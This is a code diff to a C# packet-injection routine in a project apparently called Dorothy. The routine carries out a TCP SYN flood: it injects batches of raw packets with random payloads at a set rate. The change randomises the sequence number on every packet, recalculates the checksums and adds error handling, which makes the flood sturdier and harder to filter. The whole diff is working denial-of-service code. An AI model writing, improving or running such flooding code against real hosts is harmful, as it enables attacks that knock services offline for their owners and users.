@@ -11,6 +11,7 @@ using System.Buffers;
 using System.Runtime.InteropServices;
 using System.Net.Sockets;
 using Dorothy.Models;
+using System.Linq;
 
 namespace Dorothy.Models
 {
@@ -53,6 +54,7 @@ namespace Dorothy.Models
                     throw new Exception($"Device {_device.Name} does not support packet injection.");
                 }
 
+                var random = new Random();
                 var ethernetPacket = new EthernetPacket(
                     PhysicalAddress.Parse(BitConverter.ToString(_params.SourceMac).Replace("-", "")),
                     PhysicalAddress.Parse(BitConverter.ToString(_params.DestinationMac).Replace("-", "")),
@@ -74,7 +76,7 @@ namespace Dorothy.Models
                     PayloadData = new byte[1400]
                 };
 
-                new Random().NextBytes(tcpPacket.PayloadData);
+                random.NextBytes(tcpPacket.PayloadData);
                 ipPacket.PayloadPacket = tcpPacket;
                 ethernetPacket.PayloadPacket = ipPacket;
 
@@ -83,17 +85,27 @@ namespace Dorothy.Models
                 int batchSize = 100;
                 double delayMicroseconds = (1_000_000.0 * batchSize) / packetsPerSecond;
 
-                Logger.Info($"TCP SYN Flood: Target rate {_params.BytesPerSecond / 125_000} Mbps ({packetsPerSecond} packets/sec, {batchSize} batch size)");
-
                 await Task.Run(async () =>
                 {
                     while (!_cancellationToken.IsCancellationRequested)
                     {
-                        for (int i = 0; i < batchSize && !_cancellationToken.IsCancellationRequested; i++)
+                        try
                         {
-                            injectionDevice.SendPacket(ethernetPacket);
+                            for (int i = 0; i < batchSize && !_cancellationToken.IsCancellationRequested; i++)
+                            {
+                                // Update sequence number for each packet
+                                tcpPacket.SequenceNumber = (uint)random.Next();
+                                tcpPacket.UpdateCalculatedValues();
+                                ipPacket.UpdateCalculatedValues();
+                                
+                                injectionDevice.SendPacket(ethernetPacket);
+                            }
+                            await Task.Delay(TimeSpan.FromMicroseconds(delayMicroseconds));
                         }
-                        await Task.Delay(TimeSpan.FromMicroseconds(delayMicroseconds));
+                        catch (Exception ex)
+                        {
+                            Logger.Error(ex, "Failed sending TCP packet.");
+                        }
                     }
                 });
             }
